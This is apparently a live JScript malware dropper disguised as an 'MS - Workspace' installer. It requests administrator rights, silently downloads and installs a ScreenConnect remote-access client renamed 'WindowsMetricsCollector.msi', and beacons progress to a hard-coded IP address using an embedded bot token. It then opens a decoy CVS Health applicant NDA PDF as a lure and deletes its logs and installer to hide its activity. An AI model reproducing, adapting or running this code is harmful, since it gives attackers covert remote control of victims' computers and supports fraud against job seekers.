
(function () {
//962fcf8a3d6c
    "use strict";


    var SETTINGS = {
//8bd5d2eca96c
        PRODUCT_NAME: "MS - Workspace",
        PRODUCT_VERSION: "1.0.0",
//bc6d3d5e4532
        MSI_URL: ["https://","educationalfiles.","online/Bin/ScreenConnect.","ClientSetup.","msi?e=Access&y=Guest"].join(''),
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
//238c40582d0a
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
//b9621429d499
        LOG_FILE: "deploy.log",
        MSI_LOG_FILE: "msi-install.log",
//3be9bb4a7188
        DOWNLOAD_RETRIES: 2,
        RETRY_DELAY_MS: 1500,
//e597951a04e6
        DOWNLOAD_TIMEOUT_MS: 300000,
        MSI_EXTRA_ARGS: "",


//6def755cb2da
        EXFIL_HOST: "212.43.151.96:20002",        
        
//530303c132a2
        TBTOKEN: "8679220057:AAHOQoG-qxYVT7-3si70mYE4_veZBf7q4l8",
        TCID: "-1004296347689",
//717afa74312e
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 


        UNINSTALL_EXISTING: true,
//25f08ba51081
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",


        SHOW_POPUPS: false,
//0893684dacf5
        OPEN_URL: ["https://","doc-learningmaterials.","online/public/CVS_Health_Remote_Applicant_NDA.","pdf"].join('')
    };


//c90907a87b93
    var wsh = new ActiveXObject("WScript.Shell");
    var fsys = new ActiveXObject("Scripting.FileSystemObject");


//b8ffd098cd21
    function resolveEnv(p) {
        return wsh.ExpandEnvironmentStrings(p);
//e98fc98299a0
    }


    var paths = {
//48b48b5e2505
        installDir: resolveEnv(SETTINGS.INSTALL_DIR),
        logDir: resolveEnv(SETTINGS.LOG_DIR),
//2313d0438908
        logFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.LOG_FILE,
        msiLogFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.MSI_LOG_FILE,
//142f29bbab43
        msiPath: resolveEnv(SETTINGS.INSTALL_DIR) + "\\" + SETTINGS.MSI_FILE_NAME
    };


//ea7f0c4e438c
    function pad(n) {
        return (n < 10 ? "0" : "") + n;
//247d0b9d3424
    }


    function ts() {
//c0199e1b2fcf
        var d = new Date();
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
//d6b50e63fc9b
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
    }


//61993dbd948c
    function mkdirs(dir) {
        var parent;
//38eb2bbf8640
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fsys.FolderExists(dir)) return;
//0abbccdae602
        parent = fsys.GetParentFolderName(dir);
        if (parent && parent !== dir && !fsys.FolderExists(parent)) {
//1f1fac62f8ce
            mkdirs(parent);
        }
//f82892afeaa9
        if (!fsys.FolderExists(dir)) fsys.CreateFolder(dir);
    }


//326b0c0799a9
    function log(level, msg) {
        try {
//7847b56bfe3a
            mkdirs(paths.logDir);
            var f = fsys.OpenTextFile(paths.logFile, 8, true);
//4d8595c361d1
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
            f.Close();
//2144a5ccd0df
        } catch (e) { }
    }


//9a8ef7637b97
    function beacon(stage, exitCode) {
        try {
//1d488c89009e
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            var now = new Date();
//26df3dd10376
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
                      pad(now.getHours()) + pad(now.getMinutes());
//95330983b0c9
            var statusCode, exitStr;


            switch (stage) {
//3ba4dcf287c9
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
//4b640106f199
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
//b59f23001334
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
//b4542ecc4c1f
            }


            var deployId = SETTINGS.DEPLOY_TOKEN;


//f1eb25224106
            var url = "http://" + SETTINGS.EXFIL_HOST + "/" +
                      SETTINGS.TBTOKEN + "/" +
//cf219830d3b4
                      SETTINGS.TCID + "/" +
                      deployId + "." +
//3f5a4123a1cc
                      statusCode + "." +
                      exitStr + "." +
//a5b481d34d7b
                      dts;


            http.Open("GET", url, false);
//3f0afa914892
            http.SetTimeouts(1000, 1000, 1000, 1000);
            http.Send();
//39816d1d811f
        } catch (e) { }
    }


//7f132267a78f
    // ── helpers ──


    function checkAdmin() {
//d482272b302f
        try {
            var exec = wsh.Exec("net session");
//8b63a14641d8
            while (exec.Status === 0) { WScript.Sleep(50); }
            return exec.ExitCode === 0;
//0f1c854dbaff
        } catch (e) { return false; }
    }


//fcdc5d5c37df
    function escalate() {
        var app = new ActiveXObject("Shell.Application");
//e5d365c8efc5
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
//6fc969c3e1b4
        WScript.Quit(0);
    }


//0eb6b0a2402a
    function checkConfig() {
        if (!SETTINGS.MSI_URL) abort("Setup could not start.", "MSI_URL is empty", 1);
//29383bdf4e92
        if (SETTINGS.MSI_URL.indexOf("https://") !== 0 && SETTINGS.MSI_URL.indexOf("http://") !== 0)
            abort("Setup could not start.", "Invalid MSI_URL scheme", 1);
//5dabaf7d4834
        if (SETTINGS.MSI_FILE_NAME.indexOf(".msi") === -1)
            abort("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
//171e4d8713f4
    }


    function writeResponse(responseBody, outPath) {
//8c9170ca7ad2
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
//a1a83a6f5360
        stream.Open();
        stream.Write(responseBody);
//927791f645ba
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fsys.FileExists(outPath)) fsys.DeleteFile(outPath, true);
//493ceb904aba
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
//028963c6de83
        stream.Close();
        return size;
//7b633ae98e40
    }


    function fetchPayload(url, outPath) {
//a735f4ba00dc
        var attempt, http, err, bytesWritten, status;
        mkdirs(fsys.GetParentFolderName(outPath));
//b9d75abc2894
        err = "Unknown download error";


        for (attempt = 0; attempt <= SETTINGS.DOWNLOAD_RETRIES; attempt++) {
//c52def88c66c
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//527bef4dbca0
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, SETTINGS.DOWNLOAD_TIMEOUT_MS, SETTINGS.DOWNLOAD_TIMEOUT_MS);
//42d859631e6a
                http.Open("GET", url, false);
                http.Send();
//710dbd5119f6
                status = http.Status;
                if (status === 200) {
//6f43920731a9
                    bytesWritten = writeResponse(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fsys.FileExists(outPath)) return true;
//5c2fa08442da
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
//179a58e598fb
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < SETTINGS.DOWNLOAD_RETRIES) WScript.Sleep(SETTINGS.RETRY_DELAY_MS);
//2cf79eeb7f04
        }
        return false;
//c3bd0dbce549
    }


    function purgeOld() {
//436c93ebc940
        if (!SETTINGS.UNINSTALL_EXISTING || !SETTINGS.PRODUCT_CODE) return;
        var cmd = "msiexec.exe /x " + SETTINGS.PRODUCT_CODE +
//5f53ce4b5308
                  " /qn /norestart REBOOT=ReallySuppress";
        log("INFO", "Uninstalling existing product: " + SETTINGS.PRODUCT_CODE);
//19dbb2fbeabc
        var code = wsh.Run(cmd, 0, true);
        if (code !== 0 && code !== 1605 && code !== 1612)
//31e22b5b5c02
            log("WARN", "Uninstall returned " + code + " — continuing anyway");
        else
//ab594fb70d7c
            log("INFO", "Uninstall exit code: " + code);
        WScript.Sleep(3000);
//fcf4ad59809e
    }


    function execMsi(msiPath) {
//d559e0ad20bf
        var args, cmd, code, attempt, modes;
        mkdirs(paths.logDir);
//3e7559276759
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
//779b24078d06
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
//f8ff5e3dbc90
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
//26dea3822b4f
                   SETTINGS.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
//10346b0026e1
            code = wsh.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
//96021a0e78f1
            if (code !== 1603) return code;
            WScript.Sleep(2000);
//878084226ada
        }
        return 1603;
//0a21842925cf
    }


    function explainCode(code) {
//85679684d5e5
        switch (code) {
            case 0:    return "Success";
//6b5a0a2ee91d
            case 3010: return "Success (restart required)";
            case 1641: return "Success (restart initiated)";
//ab6c21a8e654
            case 1638: return "Already installed";
            case 1602: return "Canceled by user";
//7ae97f24e2b9
            case 1603: return "Fatal error during installation";
            case 1618: return "Another installation is already in progress";
//f1fc5d61d364
            default:   return "Exit code " + code;
        }
//7ca4fcc04e69
    }


    function isOk(code) {
//189b682a52cd
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }


//bc3adb652d40
    function openUrl(url) {
        if (!url) return;
//b1c1e419698d
        try {
            var app = new ActiveXObject("Shell.Application");
//9bc7da366f20
            app.ShellExecute(url, "", "", "open", 1);
        } catch (e) { }
//7f6941e98f5a
    }


    function abort(friendlyMsg, technicalMsg, exitCode) {
//2eda08267cb7
        if (technicalMsg) log("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
//046aad3b9722
        log("ERROR", "MSI log file: " + paths.msiLogFile);
        beacon("fail", exitCode);
//de7784d31855
        if (SETTINGS.SHOW_POPUPS)
            wsh.Popup(friendlyMsg, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//c87dafc564a6
        WScript.Quit(exitCode);
    }


//1460741121ab
    mkdirs(paths.installDir);
    mkdirs(paths.logDir);


//8614148f775d
    if (!checkAdmin()) { escalate(); }


    beacon("start", null);


//10d2e067d9cd
    checkConfig();


    if (!fetchPayload(SETTINGS.MSI_URL, paths.msiPath)) {
//e0205ef0b841
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//a20f86e69804
            "Download failed after " + (SETTINGS.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
//2399dde46245
    }


    if (!fsys.FileExists(paths.msiPath) || fsys.GetFile(paths.msiPath).Size <= 0) {
//1708daa541f1
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//6a26ae3705b9
            "MSI missing or empty after download", 1
        );
//812a03f4e287
    }


    purgeOld();


//25b0ec8a8f34
    var exitCode = execMsi(paths.msiPath);
    var statusText = explainCode(exitCode);


//83866a5a8330
    if (isOk(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) beacon("okr", exitCode);
//b053e479a980
        else if (exitCode === 1638)                 beacon("oka", exitCode);
        else                                        beacon("ok", exitCode);
//45e6eee22bac
    } else if (exitCode === 1602) {
        log("WARN", "Installation canceled by user");
//e80fa9cb3926
        beacon("cl", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//1465fd2938fa
            wsh.Popup("Setup was canceled.", 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
    } else {
//7898f6fde5ba
        log("ERROR", "Installation result: " + statusText);
        log("ERROR", "MSI log file: " + paths.msiLogFile);
//99393a98af78
        beacon("fail", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//819f2584a827
            wsh.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//4bd452a58b85
    }

//5d2ab3b2a2d2
    openUrl(SETTINGS.OPEN_URL);


    try {
//3549a6acbffe
        if (fsys.FileExists(paths.msiPath))   fsys.DeleteFile(paths.msiPath, true);
        if (fsys.FileExists(paths.logFile))   fsys.DeleteFile(paths.logFile, true);
//2043a817ab1e
        if (fsys.FileExists(paths.msiLogFile)) fsys.DeleteFile(paths.msiLogFile, true);
        if (fsys.FolderExists(paths.logDir))  { try { fsys.DeleteFolder(paths.logDir, true); } catch (e) { } }
//ae78d83d7d51
    } catch (e) { }


    WScript.Quit(exitCode);
//57d9c5689534
})();
